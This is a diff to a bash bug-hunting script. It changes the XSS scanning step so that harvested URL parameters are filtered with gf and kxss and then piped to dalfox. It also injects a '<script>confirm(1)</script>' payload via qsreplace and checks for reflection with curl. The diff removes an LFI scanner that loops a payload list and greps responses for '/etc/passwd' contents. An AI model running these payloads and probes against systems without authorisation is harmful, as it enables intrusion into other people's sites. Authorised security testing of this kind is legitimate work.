@@ -53,12 +53,30 @@ XSSURLSCAN(){
     #echo "${CYAN}${WUL}cat $project/$project-all-urls.log | kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u | dalfox pipe --output $project/first.txt${RESET}"
     #cat $project/$project-all-urls.log | kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u | dalfox pipe --output $project/first.txt
 
-    echo "${CYAN}${WUL}cat $project/uniqueparam.txt | kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u | dalfox pipe --output $project/first.txt${RESET}"
-    cat $project/$project-all-urls.log | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | sed 's/=.*/=/'| sort -u > $project/uniqueparam.txt
-    cat $project/uniqueparam.txt | gf xss > $project/gfxss.txt
-    cat $project/gfxss.txt | kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u > $project/kxss.txt
-    cat $project/kxss.txt | dalfox pipe --output $project/first.txt
     
+    cat $project/$project-all-urls.log | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | sed 's/=.*/=/'| sort -u > $project/uniqueparam.txt && echo uniqueparam.txt >> $project/tmplist
+    cat $project/uniqueparam.txt | gf xss > $project/gfxss.txt && echo gfxss.txt >> $project/tmplist
+    cat $project/gfxss.txt | kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u > $project/kxss.txt && echo kxss.txt >> $project/tmplist
+    
+    echo "${MAGENTA}Total Count...${RESET}"
+    echo -n "$project-all-urls.log.txt : " & cat $project/$project-all-urls.log | wc -l
+    echo -n "uniqueparam.txt : " & cat $project/uniqueparam.txt | wc -l 
+    echo -n "gfxss.txt : " & cat $project/gfxss.txt | wc -l
+    echo -n "kxss.txt : " & cat $project/kxss.txt | wc -l
+
+    echo "${MAGENTA}Choose which results to run with dalfox...${RESET}"
+    select d in $(<$project/tmplist);
+    do test -n "$d" && break; 
+    echo ">>> Invalid Selection"; 
+    done
+    firstv=$d
+    echo "Filename: ${BLUE}$project/$firstv ${RESET}" && cat $project/$firstv
+    echo "${BLUE}Piping Dalfox on $project/$firstv! ${RESET}"
+    echo "${CYAN}${WUL}cat $project/$firstv | dalfox pipe --output $project/first.txt${RESET}"
+    
+    #running here
+    cat $project/$firstv | dalfox pipe --output $project/first.txt
+
     ##dpayload
     echo "${GREEN}[+dpayload] Waybackurl Output file > greping parameters with = > running with default payload...${RESET}"
     cat $project/uniqueparam.txt | qsreplace '"><script>confirm(1)</script>' | tee $project/$project-combinedfuzz.json && cat $project/$project-combinedfuzz.json 
@@ -68,58 +86,10 @@ XSSURLSCAN(){
     while IFS= read line
         do
             curl --silent --path-as-is --insecure "$line" | grep -qs "<script>confirm(1)" && echo ${RED}Vulnerable${RESET} $line\n && echo "$line\n" >> $project/second.txt
-        done <"$file"  
-
-    ##dalfox
-    echo "${GREEN}[+dalfox]Waybackurl Output file > greping parameters with = > Piping it to Dalfox...${RESET}"
-    echo "${CYAN}${WUL}cat $project/$project-all-urls.log | grep = | egrep -iv .(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js) | sed 's/=.*/=/' | sort -u | dalfox pipe --output $project/third.txt ${RESET}"
-    cat $project/$project-all-urls.log | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | sed 's/=.*/=/' | sort -u | dalfox pipe --output $project/third.txt 
-
-    ##cparamscan
-    #echo "${GREEN}[+cparamscan]Checking on XSS with Dalfox on Custom Parameter given...${RESET}"
-    #echo '${CYAN}${WUL}cat $project/$project-all-urls.log | grep $cparam | sed 's/=.*/=/' | dalfox pipe --output $project/fourth.txt${RESET}'
-    #cat $project/$project-all-urls.log | grep $cparam | sed 's/=.*/=/' | dalfox pipe --output $project/fourth.txt
+        done <"$file" 
 
     echo "${RED}>>>>JOOOOOOOODDDDDDDDDDD!!!!!<<<< ${RESET}"
 }
-
-
-LFI(){
-
-FILE=$project/uniqueparam.txt
-if [ -f "$FILE" ]; then
-    echo "$FILE exists."
-else 
-    echo "${GREEN}[+LFI]Checking for LFI in URL List...${RESET}"
-    cat $project/$project-all-urls.log | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | sed 's/=.*/=/'| sort -u > $project/uniqueparam.txt
-    cat $project/uniqueparam.txt | gf lfi > $project/lfiurls.txt
-    echo "${GREEN}[+LFI]Run LFIScan or LFISuite Manually...${RESET}"
-fi   
-}
-
-LFIScanner(){
-    echo -e -n ${BLUE}"\n[+] Enter path of payloads list:  "
-    read list
-    sleep 1
-
-    echo -e "\n[+] Searching For LFI: "
-    for i in $(cat $list); do
-    file=$(curl -s -m5  $URL$i)
-    echo -n -e ${YELLOW}"\nURL: $URL" >> output.txt
-    echo "$file" >> output.txt
-    if grep root:x   <<<"$file" >/dev/null 2>&1
-    then
-    echo -n -e ${RED}"\nURL: $domain ${CP}"[Payload $i]" ${RED}[Vulnerable]\n"
-    cat output.txt | grep -e  URL -e root:x  >> vulnerable_url.txt
-    cat output.txt | sed '3,18p;d' >> vulnerable_url.txt
-    rm output.txt
-    else
-    echo -n -e ${GREEN}"\nURL: $URL [Not Vulnerable]\n"
-    rm output.txt
-    fi
-    done
-}
-
 
 #Menu options
 options[0]="Run XSS Scan on Single URL"
